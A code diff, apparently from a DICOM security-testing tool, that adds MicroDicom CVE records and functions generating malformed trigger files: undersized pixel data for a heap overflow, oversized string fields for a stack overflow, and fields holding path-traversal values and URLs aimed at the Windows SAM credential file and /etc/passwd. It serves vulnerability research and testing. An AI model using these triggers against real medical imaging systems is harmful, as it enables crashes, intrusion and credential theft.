@@ -1,6 +1,5 @@
 #!/usr/bin/env python3
-"""
-CVE Sample Generator for DICOM Vulnerabilities
+"""CVE Sample Generator for DICOM Vulnerabilities
 
 Generates DICOM files that trigger specific known vulnerabilities
 for security testing and research purposes.
@@ -99,6 +98,48 @@ CVE_DATABASE: dict[str, CVEInfo] = {
             "https://nvd.nist.gov/vuln/detail/CVE-2022-2121",
         ],
     ),
+    "CVE-2024-22100": CVEInfo(
+        cve_id="CVE-2024-22100",
+        product="MicroDicom DICOM Viewer",
+        vulnerability_type="Heap-based buffer overflow",
+        cvss=7.8,
+        year=2024,
+        description="Heap-based buffer overflow when parsing malformed DICOM files",
+        affected_versions="< 2024.1",
+        fixed_version="2024.1",
+        references=[
+            "https://nvd.nist.gov/vuln/detail/CVE-2024-22100",
+            "https://www.cisa.gov/news-events/ics-medical-advisories/icsma-24-163-01",
+        ],
+    ),
+    "CVE-2024-28877": CVEInfo(
+        cve_id="CVE-2024-28877",
+        product="MicroDicom DICOM Viewer",
+        vulnerability_type="Stack-based buffer overflow",
+        cvss=8.7,
+        year=2024,
+        description="Stack-based buffer overflow allowing arbitrary code execution",
+        affected_versions="< 2024.2",
+        fixed_version="2024.2",
+        references=[
+            "https://nvd.nist.gov/vuln/detail/CVE-2024-28877",
+            "https://www.cisa.gov/news-events/ics-medical-advisories/icsma-24-163-01",
+        ],
+    ),
+    "CVE-2024-33606": CVEInfo(
+        cve_id="CVE-2024-33606",
+        product="MicroDicom DICOM Viewer",
+        vulnerability_type="Improper authorization in URL scheme handler",
+        cvss=8.8,
+        year=2024,
+        description="Custom URL scheme allows retrieval of sensitive files and planting of images",
+        affected_versions="< 2024.2",
+        fixed_version="2024.2",
+        references=[
+            "https://nvd.nist.gov/vuln/detail/CVE-2024-33606",
+            "https://www.cisa.gov/news-events/ics-medical-advisories/icsma-24-163-01",
+        ],
+    ),
     "CVE-2025-5943": CVEInfo(
         cve_id="CVE-2025-5943",
         product="MicroDicom DICOM Viewer",
@@ -184,8 +225,7 @@ class CVESampleGenerator:
         return ds
 
     def generate_cve_2019_11687(self, output_path: Path | None = None) -> Path:
-        """
-        Generate sample for CVE-2019-11687 (Preamble executable).
+        """Generate sample for CVE-2019-11687 (Preamble executable).
 
         Creates a DICOM file with PE header in preamble.
         """
@@ -216,8 +256,7 @@ class CVESampleGenerator:
         return output_path
 
     def generate_cve_2022_2119(self, output_path: Path | None = None) -> Path:
-        """
-        Generate sample for CVE-2022-2119 (DCMTK path traversal SCP).
+        """Generate sample for CVE-2022-2119 (DCMTK path traversal SCP).
 
         Creates a DICOM file with path traversal in metadata.
         """
@@ -241,8 +280,7 @@ class CVESampleGenerator:
         return output_path
 
     def generate_cve_2022_2120(self, output_path: Path | None = None) -> Path:
-        """
-        Generate sample for CVE-2022-2120 (DCMTK path traversal SCU).
+        """Generate sample for CVE-2022-2120 (DCMTK path traversal SCU).
 
         Similar to CVE-2022-2119 but for client-side.
         """
@@ -262,8 +300,7 @@ class CVESampleGenerator:
         return output_path
 
     def generate_cve_2022_2121(self, output_path: Path | None = None) -> Path:
-        """
-        Generate sample for CVE-2022-2121 (DCMTK null pointer deref).
+        """Generate sample for CVE-2022-2121 (DCMTK null pointer deref).
 
         Creates a truncated/malformed DICOM that triggers null deref.
         """
@@ -290,9 +327,97 @@ class CVESampleGenerator:
 
         return output_path
 
-    def generate_cve_2025_5943(self, output_path: Path | None = None) -> Path:
+    def generate_cve_2024_22100(self, output_path: Path | None = None) -> Path:
+        """Generate sample for CVE-2024-22100 (MicroDicom heap buffer overflow).
+
+        Creates DICOM with malformed data triggering heap overflow.
         """
-        Generate sample for CVE-2025-5943 (MicroDicom OOB write).
+        if output_path is None:
+            output_path = self.output_dir / "cve_2024_22100" / "trigger.dcm"
+
+        output_path.parent.mkdir(parents=True, exist_ok=True)
+
+        ds = self.create_base_dicom()
+        ds.PatientName = "CVE-2024-22100^HEAP_OVERFLOW"
+
+        # Heap overflow conditions - large allocations with size mismatches
+        ds.Rows = 4096
+        ds.Columns = 4096
+        ds.BitsAllocated = 16
+        ds.BitsStored = 12
+        ds.HighBit = 11
+        ds.SamplesPerPixel = 3
+        ds.PhotometricInterpretation = "RGB"
+
+        # Provide undersized pixel data to trigger overflow during copy
+        # Expected: 4096 * 4096 * 3 * 2 bytes = 100,663,296 bytes
+        # Actual: much smaller, causing potential heap corruption
+        ds.PixelData = bytes([0xAA, 0xBB] * 2048)
+
+        ds.save_as(output_path, write_like_original=False)
+        return output_path
+
+    def generate_cve_2024_28877(self, output_path: Path | None = None) -> Path:
+        """Generate sample for CVE-2024-28877 (MicroDicom stack buffer overflow).
+
+        Creates DICOM with oversized string fields triggering stack overflow.
+        """
+        if output_path is None:
+            output_path = self.output_dir / "cve_2024_28877" / "trigger.dcm"
+
+        output_path.parent.mkdir(parents=True, exist_ok=True)
+
+        ds = self.create_base_dicom()
+        ds.PatientName = "CVE-2024-28877^STACK_OVERFLOW"
+
+        # Stack overflow via oversized string fields
+        # Many DICOM viewers use fixed-size buffers for string fields
+        overflow_string = "A" * 8192  # Oversized string
+
+        ds.InstitutionName = overflow_string
+        ds.ReferringPhysicianName = overflow_string
+        ds.StudyDescription = overflow_string
+        ds.SeriesDescription = overflow_string
+
+        # Add private tags with large values
+        ds.add_new(0x00091001, "LO", "B" * 4096)
+        ds.add_new(0x00091002, "LT", "C" * 16384)
+
+        ds.save_as(output_path, write_like_original=False)
+        return output_path
+
+    def generate_cve_2024_33606(self, output_path: Path | None = None) -> Path:
+        """Generate sample for CVE-2024-33606 (MicroDicom URL scheme auth bypass).
+
+        Creates DICOM with embedded URL scheme payloads.
+        Note: This CVE is about the microdicom:// URL handler, not the file format.
+        This sample contains metadata that could be used in URL scheme attacks.
+        """
+        if output_path is None:
+            output_path = self.output_dir / "cve_2024_33606" / "trigger.dcm"
+
+        output_path.parent.mkdir(parents=True, exist_ok=True)
+
+        ds = self.create_base_dicom()
+        ds.PatientName = "CVE-2024-33606^URL_SCHEME_BYPASS"
+
+        # Payloads that could be used via microdicom:// URL scheme
+        # The vulnerability allows reading/writing arbitrary files
+        ds.PatientID = "microdicom://open?path=C:\\Windows\\System32\\config\\SAM"
+        ds.StudyDescription = "file:///etc/passwd"
+        ds.SeriesDescription = "..\\..\\..\\..\\Windows\\System32\\calc.exe"
+
+        # RetrieveURL and related network fields
+        ds.RetrieveURL = "file:///C:/sensitive/data.dcm"
+
+        # Add Referenced File ID with traversal
+        ds.add_new(0x00041500, "CS", "..\\..\\..\\secrets.txt")
+
+        ds.save_as(output_path, write_like_original=False)
+        return output_path
+
+    def generate_cve_2025_5943(self, output_path: Path | None = None) -> Path:
+        """Generate sample for CVE-2025-5943 (MicroDicom OOB write).
 
         Creates DICOM with malformed structure triggering OOB write.
         """
@@ -320,8 +445,7 @@ class CVESampleGenerator:
         return output_path
 
     def generate_cve_2025_11266(self, output_path: Path | None = None) -> Path:
-        """
-        Generate sample for CVE-2025-11266 (GDCM PixelData OOB write).
+        """Generate sample for CVE-2025-11266 (GDCM PixelData OOB write).
 
         Creates DICOM with malformed encapsulated pixel data fragments.
         """
@@ -370,8 +494,7 @@ class CVESampleGenerator:
         return output_path
 
     def generate_cve_2025_53618(self, output_path: Path | None = None) -> Path:
-        """
-        Generate sample for CVE-2025-53618 (GDCM JPEG codec OOB read).
+        """Generate sample for CVE-2025-53618 (GDCM JPEG codec OOB read).
 
         Creates DICOM with malformed JPEG-LS compressed data.
         """
@@ -430,6 +553,9 @@ class CVESampleGenerator:
             "CVE-2022-2119": self.generate_cve_2022_2119,
             "CVE-2022-2120": self.generate_cve_2022_2120,
             "CVE-2022-2121": self.generate_cve_2022_2121,
+            "CVE-2024-22100": self.generate_cve_2024_22100,
+            "CVE-2024-28877": self.generate_cve_2024_28877,
+            "CVE-2024-33606": self.generate_cve_2024_33606,
             "CVE-2025-5943": self.generate_cve_2025_5943,
             "CVE-2025-11266": self.generate_cve_2025_11266,
             "CVE-2025-53618": self.generate_cve_2025_53618,
